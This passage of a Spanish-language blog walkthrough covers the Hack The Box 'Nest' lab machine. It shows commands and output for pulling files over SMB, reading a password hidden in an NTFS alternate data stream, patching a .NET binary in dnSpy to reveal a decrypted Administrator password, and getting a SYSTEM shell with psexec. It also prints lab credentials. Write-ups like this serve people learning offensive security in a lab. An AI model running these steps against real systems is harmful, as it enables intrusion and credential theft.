getting file <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\D</span>ebug Mode Password.txt of size 0 as Debug Mode Password.txt <span class="o">(</span>0.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.2 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\H</span>QK_Config_Backup.xml of size 249 as HQK_Config_Backup.xml <span class="o">(</span>0.4 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.3 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\&gt;</span> <span class="nb">cd</span> <span class="s2">"AD Integration Module"</span>
smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\A</span>D Integration Module<span class="se">\&gt;</span> mget <span class="k">*</span>
getting file <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\A</span>D Integration Module<span class="se">\H</span>qkLdap.exe of size 17408 as HqkLdap.exe <span class="o">(</span>30.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 5.1 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\A</span>D Integration Module<span class="se">\&gt;</span>
</code></pre></div></div>

<p>Vamos a echarle un ojo a los archivos de tenemos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ll
.rw-r--r-- root root   0 B  Fri Jan 14 20:12:15 2022  Debug Mode Password.txt
.rw-r--r-- root root 249 B  Fri Jan 14 20:12:16 2022  HQK_Config_Backup.xml
.rw-r--r-- root root  17 KB Fri Jan 14 20:12:41 2022  HqkLdap.exe
❯ file HqkLdap.exe
HqkLdap.exe: PE32 executable <span class="o">(</span>console<span class="o">)</span> Intel 80386 Mono/.Net assembly, <span class="k">for </span>MS Windows
</code></pre></div></div>

<p>Vemos que el archivo <code class="language-plaintext highlighter-rouge">Debug Mode Password.txt</code> no tiene contenido pero nos da una pista, que es posible que contenga <strong><em>Alternate Data Streams (ADS)</em></strong> en donde se liste la contraseña del <strong>Debug Mode</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.10.178/Users <span class="nt">-U</span> <span class="s1">'c.smith'</span>
Enter WORKGROUP<span class="se">\c</span>.smith<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; cd C.Smith
smb: \C.Smith\&gt; dir
  .                                   D        0  Sun Jan 26 01:21:44 2020
  ..                                  D        0  Sun Jan 26 01:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 18:06:17 2019
  user.txt                            A       34  Fri Jan 14 16:58:31 2022
cd 
                5242623 blocks of size 4096. 1839999 blocks available
smb: \C.Smith\&gt; cd "HQK Reporting"
smb: \C.Smith\HQK Reporting\&gt; dir
  .                                   D        0  Thu Aug  8 18:06:17 2019
  ..                                  D        0  Thu Aug  8 18:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 07:18:42 2019
  Debug Mode Password.txt             A        0  Thu Aug  8 18:08:17 2019
  HQK_Config_Backup.xml               A      249  Thu Aug  8 18:09:05 2019

                5242623 blocks of size 4096. 1839999 blocks available
smb: \C.Smith\HQK Reporting\&gt; allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time:    jue ago  8 18:06:12 2019 CDT
access_time:    jue ago  8 18:06:12 2019 CDT
write_time:     jue ago  8 18:08:17 2019 CDT
change_time:    mié jul 21 13:47:12 2021 CDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
smb: \C.Smith\HQK Reporting\&gt;
</span></code></pre></div></div>

<p>Vemos que contiene un parámetro llamado <code class="language-plaintext highlighter-rouge">Password</code>, así que vamos a extraer el archivo agregando dicho parámetro.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\&gt;</span> get <span class="s2">"Debug Mode Password.txt:Password"</span>
getting file <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\D</span>ebug Mode Password.txt:Password of size 15 as Debug Mode Password.txt:Password <span class="o">(</span>0.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.0 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\&gt;</span> 
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat</span> <span class="s2">"Debug Mode Password.txt:Password"</span>
───────┬────────────────────────────────────────
       │ File: Debug Mode Password.txt:Password
───────┼────────────────────────────────────────
   1   │ WBQ201953D8w 
───────┴────────────────────────────────────────
</code></pre></div></div>

<p>Ya tenemos una contraseña del <strong>Debug Mode</strong> el cual podría estar relacionado con el puerto que no hemos tocado: 4386; asi que trataremos de conectarnos a través de TELNET.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>

HQK Reporting Service V1.2

<span class="o">&gt;</span><span class="nb">help

</span>This service allows <span class="nb">users </span>to run queries against databases using the legacy HQK format

<span class="nt">---</span> AVAILABLE COMMANDS <span class="nt">---</span>

LIST
SETDIR &lt;Directory_Name&gt;
RUNQUERY &lt;Query_ID&gt;
DEBUG &lt;Password&gt;
HELP &lt;Command&gt;
<span class="o">&gt;</span>DEBUG WBQ201953D8w

Debug mode enabled. Use the HELP <span class="nb">command </span>to view additional commands that are now available
<span class="o">&gt;</span>

</code></pre></div></div>

<p>Aquí podríamos pensar como para que nos sirve esto, pues bueno, resulta que está aplicación nos permite navegar en los recursos de la máquina víctima; si vemos las opciones que tenemos como <strong>Debug mode enabled</strong>, tenemos algunas más y la que podría interesarnos sería <code class="language-plaintext highlighter-rouge">SETDIR</code> y <code class="language-plaintext highlighter-rouge">LIST</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span>HELP  

This service allows <span class="nb">users </span>to run queries against databases using the legacy HQK format

<span class="nt">---</span> AVAILABLE COMMANDS <span class="nt">---</span>

LIST
SETDIR &lt;Directory_Name&gt;
RUNQUERY &lt;Query_ID&gt;
DEBUG &lt;Password&gt;
HELP &lt;Command&gt;
SERVICE
SESSION
SHOWQUERY &lt;Query_ID&gt;

<span class="o">&gt;</span>
</code></pre></div></div>

<p>Vamos a ver que tenemos en el recurso en donde nos encontramos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span>LIST

Use the query ID numbers below with the RUNQUERY <span class="nb">command </span>and the directory names with the SETDIR <span class="nb">command

 </span>QUERY FILES IN CURRENT DIRECTORY

<span class="o">[</span>DIR]  COMPARISONS
<span class="o">[</span>1]   Invoices <span class="o">(</span>Ordered By Customer<span class="o">)</span>
<span class="o">[</span>2]   Products Sold <span class="o">(</span>Ordered By Customer<span class="o">)</span>
<span class="o">[</span>3]   Products Sold In Last 30 Days

Current Directory: ALL QUERIES
<span class="o">&gt;</span>SETDIR ..

Current directory <span class="nb">set </span>to HQK
<span class="o">&gt;</span>LIST

Use the query ID numbers below with the RUNQUERY <span class="nb">command </span>and the directory names with the SETDIR <span class="nb">command

 </span>QUERY FILES IN CURRENT DIRECTORY

<span class="o">[</span>DIR]  ALL QUERIES
<span class="o">[</span>DIR]  LDAP
<span class="o">[</span>DIR]  Logs
<span class="o">[</span>1]   HqkSvc.exe
<span class="o">[</span>2]   HqkSvc.InstallState
<span class="o">[</span>3]   HQK_Config.xml

Current Directory: HQK
<span class="o">&gt;</span>
</code></pre></div></div>

<p>Nos encontramos en el directorio <strong>ALL QUERIES</strong>, si retrocedemos uno directorio, vemos algunas cositas que nos llaman la atención, como <strong>LDAP</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span>SETDIR LDAP

Current directory <span class="nb">set </span>to LDAP
<span class="o">&gt;</span>LIST

Use the query ID numbers below with the RUNQUERY <span class="nb">command </span>and the directory names with the SETDIR <span class="nb">command

 </span>QUERY FILES IN CURRENT DIRECTORY

<span class="o">[</span>1]   HqkLdap.exe
<span class="o">[</span>2]   Ldap.conf

Current Directory: LDAP
<span class="o">&gt;</span>
</code></pre></div></div>

<p>Una vez que entramos a dicho recurso, vemos el mismo ejecutable que encontramos que es <code class="language-plaintext highlighter-rouge">HqkLdap.exe</code> y otro archivo llamado <code class="language-plaintext highlighter-rouge">Ldap.conf</code> al cual le echaremos un ojo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span>SHOWQUERY 2

<span class="nv">Domain</span><span class="o">=</span>nest.local
<span class="nv">Port</span><span class="o">=</span>389
<span class="nv">BaseOu</span><span class="o">=</span><span class="nv">OU</span><span class="o">=</span>WBQ Users,OU<span class="o">=</span>Production,DC<span class="o">=</span>nest,DC<span class="o">=</span><span class="nb">local
</span><span class="nv">User</span><span class="o">=</span>Administrator
<span class="nv">Password</span><span class="o">=</span>yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4<span class="o">=</span>

<span class="o">&gt;</span>
</code></pre></div></div>

<p>Vemos las credenciales del usuario <strong>Administrator</strong> y una contraseña que lo más seguro se encuentre cifrada y mediante el archivo <code class="language-plaintext highlighter-rouge">HqkLdap.exe</code> podríamos descifrarla, así que lo primero que haremos es analizar los archivos en una máquina Windows; por lo que los transferimos con <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> los siguientes archivos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ll
.rw-r--r-- root root  17 KB Fri Jan 14 20:39:43 2022  HqkLdap.exe
.rw-r--r-- root root 151 B  Fri Jan 14 20:40:04 2022  Ldap.conf

</code></pre></div></div>

<p>Ahora en nuestro equipo Windows, primero nos descargamos la herramienta <a href="https://github.com/dnSpy/dnSpy/releases/tag/v6.1.8">dnSpy</a> de acuerdo con la arquitectura de nuestra máquina. Nos pasamos los archivos que compartimos por <code class="language-plaintext highlighter-rouge">impacket-smbserver</code>:</p>

<p><img src="/assets/images/htb-nest/nest-rdp.png" alt="" /></p>

<p>Ahora abrimos la herramienta <strong>dnSpy</strong> y abrimos el archivo <code class="language-plaintext highlighter-rouge">HqkLdap.exe</code> y buscamos el módulo main:</p>

<p><img src="/assets/images/htb-nest/nest-rdp1.png" alt="" /></p>

<p>Para tener referencia de lo que estamos buscando, vamos a ejecutar el programa y ver las respuestas que nos arroja.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\k</span>4miyo<span class="se">\D</span>esktop<span class="se">\W</span>ORKING&gt; ./HqkLdap.exe
Invalid number of <span class="nb">command </span>line arguments
PS C:<span class="se">\U</span>sers<span class="se">\k</span>4miyo<span class="se">\D</span>esktop<span class="se">\W</span>ORKING&gt; ./HqkLdap.exe Ldap.conf
Please ensure the optional database import module is installed
PS C:<span class="se">\U</span>sers<span class="se">\k</span>4miyo<span class="se">\D</span>esktop<span class="se">\W</span>ORKING&gt; ./HqkLdap.exe loquesea
Specified config file does not exist
PS C:<span class="se">\U</span>sers<span class="se">\k</span>4miyo<span class="se">\D</span>esktop<span class="se">\W</span>ORKING&gt;
</code></pre></div></div>

<p>Y como podemos observar, las respuestas que nos arroja se muestran en la validaciones del programa; por lo tanto vamos a eliminar que busca el archivo <code class="language-plaintext highlighter-rouge">HqkDbImport.exe</code> haciendo click secundario en el código y seleccionando <strong>Edit Method</strong>, eliminamos las siguientes partes del código:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="o">!</span><span class="n">File</span><span class="p">.</span><span class="n">Exists</span><span class="p">(</span><span class="s">"HqkDbImport.exe"</span><span class="p">))</span>
<span class="p">{</span>
        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"Please ensure the optional database import module is installed"</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">try</span>
<span class="p">{</span>

<span class="p">}</span>
<span class="n">finally</span>
<span class="p">{</span>
        <span class="n">List</span><span class="o">&lt;</span><span class="n">string</span><span class="o">&gt;</span><span class="p">.</span><span class="n">Enumerator</span> <span class="n">enumerator</span><span class="p">;</span>
        <span class="p">((</span><span class="n">IDisposable</span><span class="p">)</span><span class="n">enumerator</span><span class="p">).</span><span class="n">Dispose</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Y agregamos la siguiente linea para poder observar la contraseña al ejecutarlo.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"Performing LDAP query..."</span><span class="p">);</span>
<span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">ldap</span><span class="p">.</span><span class="n">Password</span><span class="p">);</span>
</code></pre></div></div>

<p>Guardamos los cambios con un nombre descriptivo y procedemos a ejecutarlo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\k</span>4miyo<span class="se">\D</span>esktop<span class="se">\W</span>ORKING&gt; ./HqkLdap_modified.exe Ldap.conf
Performing LDAP query...
XtH4nkS4Pl4y1nGX
Unexpected error: El dominio especificado no existe o no se puede establecer contacto con él.
PS C:<span class="se">\U</span>sers<span class="se">\k</span>4miyo<span class="se">\D</span>esktop<span class="se">\W</span>ORKING&gt;
</code></pre></div></div>

<p>Ya tenemos la contraseña del usuario <strong>Administrator</strong>, por lo tanto vamos a validarla.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.178 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'XtH4nkS4Pl4y1nGX'</span>
SMB         10.10.10.178    445    HTB-NEST         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 <span class="o">(</span>name:HTB-NEST<span class="o">)</span> <span class="o">(</span>domain:HTB-NEST<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.178    445    HTB-NEST         <span class="o">[</span>+] HTB-NEST<span class="se">\A</span>dministrator:XtH4nkS4Pl4y1nGX <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<p>La contraseña es válida y podemos ejecutar comandos (<code class="language-plaintext highlighter-rouge">Pwn3d!</code>), así que vamos a conectarnos con <code class="language-plaintext highlighter-rouge">psexec</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 /usr/share/doc/python3-impacket/examples/psexec.py WORKGROUP/Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178 cmd.exe
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.178.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file QbtOevSn.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.178.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service bNhT on 10.10.10.178.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service bNhT.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 6.1.7601]
Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<p>Ya somos el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> y podemos visualizar las flags (user.txt y root.txt).</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#cryptography" class="page__taxonomy-item" rel="tag">Cryptography</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#file-misconfiguration" class="page__taxonomy-item" rel="tag">File_Misconfiguration</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#vba" class="page__taxonomy-item" rel="tag">VBA</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-01-15T00:00:00-06:00">January 15, 2022</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-resolute/" class="pagination--pager" title="Hack The Box Resolute
">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 K4miyo</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
